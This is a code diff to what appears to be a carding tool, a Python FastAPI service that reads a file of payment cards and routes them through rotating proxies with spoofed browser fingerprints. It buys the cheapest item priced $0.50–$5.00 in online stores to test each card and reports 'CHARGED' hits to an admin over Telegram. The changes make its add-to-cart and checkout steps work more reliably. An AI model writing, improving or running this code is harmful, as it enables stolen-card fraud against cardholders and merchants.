@@ -24,7 +24,6 @@ Environment variables (all optional):
 import asyncio
 import sys
 import copy
-
 import logging
 import os
 import random
@@ -43,12 +42,12 @@ from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import JSONResponse
 
 # ---------------------------------------------------------------------------
-# Configuration from environment  (Railway Pro defaults — 5 replicas)
+# Configuration
 # ---------------------------------------------------------------------------
 PORT             = int(os.environ.get("PORT", 8080))
 WORKERS          = int(os.environ.get("WORKERS", 8))
 CARDS_FILE       = os.environ.get("CARDS_FILE", "cards.txt")
-MAX_PRICE        = float(os.environ.get("MAX_PRICE", 5.0))   # 0.50 - 5.00 ডলার সীমা
+MAX_PRICE        = float(os.environ.get("MAX_PRICE", 5.0))
 MIN_PRICE        = float(os.environ.get("MIN_PRICE", 0.50))
 SITE_CONCURRENCY = int(os.environ.get("SITE_CONCURRENCY", 100))
 POOL_SIZE        = int(os.environ.get("POOL_SIZE", 3000))
@@ -75,7 +74,7 @@ async def send_hit_to_admin(card: str, status: str, response: str, gateway: str,
     """Fire-and-forget Telegram notification for Charged/Approved hits."""
     try:
         from datetime import datetime as _dt
-        import urllib.request, urllib.parse, json as _json
+        import urllib.request, json as _json
 
         if "CHARGED" in status.upper() or "ORDER_PLACED" in status.upper():
             status_text = "\U0001f48e CHARGED"
@@ -788,6 +787,7 @@ def _make_session(proxy_str: Optional[str]) -> tuple[AsyncSession, dict, bool]:
     profile = random.choice(BROWSER_PROFILES)
     proxy = _parse_proxy(proxy_str) if proxy_str else None
     proxies = {"http": proxy, "https": proxy} if proxy else None
+    # curl_cffi respects default timeouts, we set a safe timeout here
     session = AsyncSession(impersonate=profile["impersonate"], timeout=REQUEST_TIMEOUT, proxies=proxies)
     return session, profile, True
 
@@ -803,9 +803,6 @@ async def _fetch_products(
 ) -> tuple[Optional[dict], list[dict], Optional[str]]:
     """
     Returns (best_product, all_candidates_under_max_price, error_string).
-    - Always sorts to find the cheapest product under MIN_PRICE-MAX_PRICE.
-    - Retries 3 times on proxy/timeout errors.
-    - Returns "PROXY_ERROR: ..." if proxy fails.
     """
     if not base_url.startswith("http"):
         base_url = "https://" + base_url
@@ -1071,18 +1068,18 @@ async def validate_card(
                     "Content-Type":       "application/json",
                     "Origin":             ourl,
                     "Referer":            f"{ourl}/",
+                    "X-Requested-With":   "XMLHttpRequest",
                 }
                 if profile.get("sec_ch_ua"):
                     base_headers["sec-ch-ua"] = profile["sec_ch_ua"]
                     base_headers["sec-ch-ua-mobile"] = profile["sec_ch_ua_mobile"]
                     base_headers["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]
 
+                # 1. Add to cart (Fixed logic & headers)
                 cart_added = False
                 for payload, ct in [
-                    (f"id={variant_id}&quantity=1",
-                     "application/x-www-form-urlencoded"),
-                    (orjson.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}),
-                     "application/json"),
+                    (f"id={variant_id}&quantity=1", "application/x-www-form-urlencoded"),
+                    (orjson.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}), "application/json"),
                 ]:
                     try:
                         r = await session.post(
@@ -1090,10 +1087,14 @@ async def validate_card(
                             data=payload,
                             headers={**base_headers, "Content-Type": ct, "Accept": "application/json"},
                         )
-                        if r.status_code == 200:
-                            cart_added = True
-                            break
-                    except Exception:
+                        if r.status_code in (200, 201):
+                            # Verify actual cart response
+                            res_json = orjson.loads(r.content)
+                            if "items" in res_json or "id" in res_json:
+                                cart_added = True
+                                break
+                    except Exception as e:
+                        log.debug(f"Cart Add Error: {e}")
                         continue
 
                 if not cart_added:
@@ -1101,12 +1102,13 @@ async def validate_card(
                         res = session.close()
                         if asyncio.iscoroutine(res): await res
                     if outer_attempt < max_retries - 1:
-                        await asyncio.sleep(0.5)
+                        await asyncio.sleep(1)
                         continue
                     return _r("CART_FAILED")
 
                 await asyncio.sleep(random.uniform(0.12, 0.35))
 
+                # 2. Get Checkout page
                 try:
                     cr = await session.post(
                         f"{ourl}/checkout/",
